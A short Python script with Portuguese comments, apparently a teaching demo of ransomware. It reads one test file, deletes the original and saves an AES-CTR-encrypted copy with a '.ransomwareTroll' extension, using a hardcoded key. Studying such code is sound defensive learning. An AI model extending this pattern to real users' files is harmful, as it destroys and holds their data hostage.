import os # Biblioteca de interação com o Sistema Operacional
import pyaes # Biblioteca responsável pela criptografia

# Abrir o arquivo

file_name = "teste.txt" # Arquivo que será criptografado
file_ = open(file_name, "rb") # "rb" indica que o arquivo será aberto
file_data = file_.read() # Essa varável vai pegar os dados do arquivo
file_.close() # Essa linha irá fechar o arquivo

# Remover o arquivo

os.remove(file_name) # Essa linha de código irá deletar o arquivo "teste.txt"

# Chave de criptografia

key = b"testeransomware6" # Chave de 16 byts
aes = pyaes.AESModeOfOperationCTR(key)

# Cripitografar o arquivo

crypt_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado

new_file = file_name + ".ransomwareTroll"
new_file = open(f"{new_file}", "wb") # Abre o arquivo no modo de edição
new_file.write(crypt_data)
new_file.close()
